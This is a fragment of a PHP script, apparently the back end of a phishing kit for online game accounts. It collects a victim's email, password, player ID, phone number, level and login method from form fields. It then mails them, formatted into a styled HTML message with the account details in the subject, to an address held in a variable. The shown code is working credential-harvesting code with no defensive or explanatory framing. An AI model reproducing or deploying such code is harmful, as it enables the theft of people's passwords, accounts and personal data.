...
$cek = new Useragent();
$email = $cek->post($_POST['email']);
$password = $cek->post($_POST['password']);
$playid = $cek->post($_POST['playid']);
$phone = $cek->post($_POST['phone']);
$level = $cek->post($_POST['level']);
$login = $cek->post($_POST['login']);
...
// KONTEN RESULT AKUN
$subjek = "$hasil_arpantek_flag | $arpantekCalling | LEVEL $level | LOGIN $login | ID $playid";
$pesan = '
<center> 
<div style="background: url(https://i.ibb.co/v4ddLJj/20210815-141503.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
...
$headers .= ''.$sender.'' . "\r\n";
$cek->mail($emailku, $subjek, $pesan, $headers);
